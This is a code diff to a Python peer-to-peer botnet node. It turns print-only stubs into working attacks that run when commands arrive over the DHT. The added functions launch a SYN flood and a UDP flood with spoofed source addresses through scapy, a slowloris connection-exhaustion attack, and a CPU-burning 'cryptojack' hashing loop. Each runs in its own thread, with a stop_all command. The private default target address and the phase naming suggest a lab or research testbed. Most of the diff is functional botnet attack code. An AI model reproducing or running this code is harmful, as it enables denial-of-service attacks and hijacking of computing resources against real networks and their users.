@@ -309,6 +309,96 @@ def parse_msg(data: bytes) -> dict | None:
         return None
 
 
+# ── Module-level attack helpers (called via KademliaNode._launch) ────────────
+# These mirror the covert_bot.py helpers so both Phase 2 and Phase 3 bots
+# execute attacks consistently.
+
+def _p2p_syn_flood(target: str, port: int, duration: int,
+                   stop: threading.Event):
+    try:
+        from scapy.all import IP, TCP, send, conf; conf.verb = 0
+    except ImportError:
+        print("[P2P] Scapy not installed — pip3 install scapy"); return
+    print(f"[P2P] SYN FLOOD -> {target}:{port}  duration={duration}s")
+    end, count = time.time() + duration, 0
+    while time.time() < end and not stop.is_set():
+        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        pkt = IP(src=src, dst=target) / TCP(
+            sport=random.randint(1024, 65535), dport=port,
+            flags="S", seq=random.randint(0, 2**32-1))
+        send(pkt, verbose=False); count += 1
+    print(f"[P2P] SYN FLOOD done. Packets: {count}")
+
+def _p2p_udp_flood(target: str, duration: int, stop: threading.Event):
+    try:
+        from scapy.all import IP, UDP, Raw, send, conf; conf.verb = 0
+    except ImportError:
+        print("[P2P] Scapy not installed"); return
+    print(f"[P2P] UDP FLOOD -> {target}  duration={duration}s")
+    payload = b'\x00' * 1024
+    end, count = time.time() + duration, 0
+    while time.time() < end and not stop.is_set():
+        src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        pkt = IP(src=src, dst=target) / UDP(
+            sport=random.randint(1024, 65535),
+            dport=random.randint(1, 65534)) / Raw(load=payload)
+        send(pkt, verbose=False); count += 1
+    print(f"[P2P] UDP FLOOD done. Packets: {count}")
+
+def _p2p_slowloris(target: str, port: int, duration: int,
+                   stop: threading.Event):
+    try:
+        from slowloris import slowloris
+        print(f"[P2P] SLOWLORIS -> {target}:{port}  duration={duration}s")
+        t = threading.Thread(target=slowloris,
+                             args=(target, port, 150, duration), daemon=True)
+        t.start()
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set(): time.sleep(1)
+        return
+    except ImportError:
+        pass
+    # Inline fallback
+    socks = []
+    for _ in range(100):
+        if stop.is_set(): break
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(4); s.connect((target, port))
+            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
+            socks.append(s)
+        except Exception: pass
+    end = time.time() + duration
+    while time.time() < end and not stop.is_set():
+        dead = []
+        for s in socks:
+            try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
+            except Exception: dead.append(s)
+        for s in dead: socks.remove(s); s.close()
+        time.sleep(10)
+    for s in socks:
+        try: s.close()
+        except Exception: pass
+
+def _p2p_cryptojack(duration: int, cpu: float, stop: threading.Event):
+    try:
+        from cryptojack_sim import CryptojackSimulator
+        sim = CryptojackSimulator(target_pct=cpu, duration=duration)
+        sim.start()
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set(): time.sleep(1)
+        sim.stop(); return
+    except ImportError:
+        pass
+    state = os.urandom(32)
+    end = time.time() + duration
+    while time.time() < end and not stop.is_set():
+        work_end = time.perf_counter() + cpu * 0.1
+        while time.perf_counter() < work_end:
+            state = hashlib.sha256(state).digest()
+        time.sleep((1.0 - cpu) * 0.1)
+
+
 # ── P2P Kademlia Node ─────────────────────────────────────────
 
 class KademliaNode:
@@ -341,6 +431,8 @@ class KademliaNode:
         self._lock = threading.Lock()
         self.bootstrap_peers = bootstrap_peers or []
         self.executed_cmds: set[str] = set()  # prevent re-execution
+        self._active: dict[str, tuple] = {}   # cmd_type -> (thread, stop_event)
+        self._active_lock = threading.Lock()
 
         print(f"[P2P] Node ID: {self.node_id.to_hex()[:16]}...")
         print(f"[P2P] Listening on {host}:{port}")
@@ -673,22 +765,64 @@ class KademliaNode:
         self.executed_cmds.add(cmd_hash)
         self._execute_command(cmd)
 
+    # ── Attack helpers ────────────────────────────────────────
+
+    def _launch(self, cmd_type: str, fn, *args):
+        """Run attack fn in a daemon thread; cancel any prior instance."""
+        with self._active_lock:
+            if cmd_type in self._active:
+                _, old_stop = self._active.pop(cmd_type)
+                old_stop.set()
+            stop = threading.Event()
+            t = threading.Thread(target=fn, args=(*args, stop),
+                                 daemon=True, name=f"p2p-{cmd_type}")
+            t.start()
+            self._active[cmd_type] = (t, stop)
+        print(f"[P2P] Launched: {cmd_type}")
+
     def _execute_command(self, cmd: dict):
-        """Execute a botnet command received via DHT."""
+        """Execute a botnet command received via DHT — ACTUALLY RUNS attacks."""
         cmd_type = cmd.get("type", "idle")
         print(f"[P2P] Executing: {json.dumps(cmd)}")
 
         if cmd_type == "syn_flood":
-            print(f"[P2P] -> SYN Flood: {cmd.get('target')} for {cmd.get('duration')}s")
+            target   = cmd.get("target", "192.168.100.20")
+            port     = int(cmd.get("port", 80))
+            duration = int(cmd.get("duration", 30))
+            self._launch("syn_flood", _p2p_syn_flood, target, port, duration)
+
         elif cmd_type == "udp_flood":
-            print(f"[P2P] -> UDP Flood: {cmd.get('target')} for {cmd.get('duration')}s")
+            target   = cmd.get("target", "192.168.100.20")
+            duration = int(cmd.get("duration", 30))
+            self._launch("udp_flood", _p2p_udp_flood, target, duration)
+
         elif cmd_type == "slowloris":
-            print(f"[P2P] -> Slowloris: {cmd.get('target')}:{cmd.get('port',80)}")
+            target   = cmd.get("target", "192.168.100.20")
+            port     = int(cmd.get("port", 80))
+            duration = int(cmd.get("duration", 60))
+            self._launch("slowloris", _p2p_slowloris, target, port, duration)
+
+        elif cmd_type == "cryptojack":
+            duration = int(cmd.get("duration", 120))
+            cpu      = float(cmd.get("cpu", 0.25))
+            self._launch("cryptojack", _p2p_cryptojack, duration, cpu)
+
+        elif cmd_type == "stop_all":
+            print("[P2P] stop_all — halting active attacks")
+            with self._active_lock:
+                for _, (_, ev) in self._active.items(): ev.set()
+                self._active.clear()
+
         elif cmd_type == "idle":
             print(f"[P2P] -> Idle")
+
         elif cmd_type == "shutdown":
             print(f"[P2P] -> Shutdown command received")
+            with self._active_lock:
+                for _, (_, ev) in self._active.items(): ev.set()
+                self._active.clear()
             self._running = False
+
         else:
             print(f"[P2P] -> Unknown: {cmd_type}")
 
@@ -770,6 +904,8 @@ class KademliaNode:
 
     def status(self) -> dict:
         contacts = self.routing.all_contacts()
+        with self._active_lock:
+            active_attacks = list(self._active.keys())
         return {
             "node_id": self.node_id.to_hex(),
             "host": self.host,
@@ -777,6 +913,7 @@ class KademliaNode:
             "peer_count": len(contacts),
             "store_keys": list(self.store.keys()),
             "bucket_fill": self.routing.bucket_stats(),
+            "active_attacks": active_attacks,
         }
 
 
